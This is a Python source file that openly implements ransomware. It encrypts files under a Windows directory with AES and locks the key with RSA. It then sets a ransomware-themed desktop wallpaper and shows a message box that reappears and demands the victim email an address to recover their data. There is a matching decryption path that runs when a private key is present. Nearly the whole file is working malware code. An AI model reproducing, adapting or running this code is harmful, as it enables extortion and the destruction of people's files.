import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from Crypto import Random
import hashlib
import base64
import urllib.request
import ctypes
import datetime
import time
import win32gui
import subprocess


# This is a sample Python script.

# Press ⌃R to execute it or replace it with your code.
# Press Double ⇧ to search everywhere for classes, files, tool windows, actions, and settings.

class Ransomware:

    def __init__(self, current_user, decrypt=False):
        self.key = None
        self.public_key = None
        self.decrypt = decrypt
        self.root = current_user
        self.system = r'C:\Windows\System32\Encriptar'

    def get_AES_key(self):
        if not self.decrypt:
            self.key = base64.b64encode(Random.new().read(128))
            self.encrypt_AES_key()
        else:
            self.decrypt_AES_key()

        self.key = hashlib.sha256(self.key).digest()

    def decrypt_AES_key(self):
        private_key = RSA.import_key(open(self.root + 'private.pem').read())
        cipher_rsa = PKCS1_OAEP.new(private_key)
        with open(self.root + "winsys.txt", 'rb') as f:
            aes_key = f.read()
        self.key = cipher_rsa.decrypt(aes_key)

    def encrypt_AES_key(self):
        self.public_key = RSA.import_key(open(self.root + 'public.pem').read())
        cipher_rsa = PKCS1_OAEP.new(self.public_key)
        encrypted_aes_key = cipher_rsa.encrypt(self.key)
        with open(self.root + "winsys.txt", 'wb') as f:
            f.write(encrypted_aes_key)

    def check_system(self, decrypt=False):

        system = os.walk(self.system, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                self.check_file(file_path, decrypt)

    def check_file(self, file_path, decrypt):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()

                if not decrypt:
                    data = pad(data, AES.block_size)
                    iv = Random.new().read(AES.block_size)
                    print(iv)
                    print(base64.b64encode(iv))
                    print(AES.block_size)
                    cipher = AES.new(self.key, AES.MODE_CBC, iv)
                    data = base64.b64encode(iv + cipher.encrypt(data))
                    with open(file_path, 'wb') as f:
                        f.write(data)
                else:
                    print(data)
                    data = base64.b64decode(data)
                    iv = data[:AES.block_size]
                    print(iv)
                    cipher = AES.new(self.key, AES.MODE_CBC, iv)
                    data = unpad(cipher.decrypt(data[AES.block_size:]), AES.block_size)
                    with open(file_path, 'wb') as f:
                        f.write(data)
        except Exception as e:
            print(e)

    def run(self):
        self.get_AES_key()
        self.check_system(self.decrypt)

    def photo_background(self):
        photo_url = "https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876" \
                    "-100749983-large.jpg "
        path = "{0:s}back.jpg".format(self.root)
        urllib.request.urlretrieve(photo_url, path)
        SPI_SETDESWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESWALLPAPER, 0, path, 0)


def show_message_box():
    date = datetime.date.today().strftime("%d-%B-%Y")
    result = ctypes.windll.user32.MessageBoxW(0, "The disk of your computer has been hacked the day: {0:s}\nIn order to retrieve your data send a email to hacked@email.com".format(date), "Congrats", 0x40000)
    if result:
        show_message_box()


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    try:
        print(os.path)
        public = False
        private = False
        current_user = os.path.expanduser('~') + '\\AppData\\Local\\'

        if os.path.exists(current_user + "public.pem"):
            public = True
        if os.path.exists(current_user + "private.pem"):
            private = True
        if private:
            ransomware = Ransomware(current_user, private)
            ransomware.run()
        elif public:
            print("ENCRIPTAR")
            ransomware = Ransomware(current_user)
            ransomware.run()
            try:
                ransomware.photo_background()
            except:
                pass
            show_message_box()
        
    except Exception as e:
        print(e)
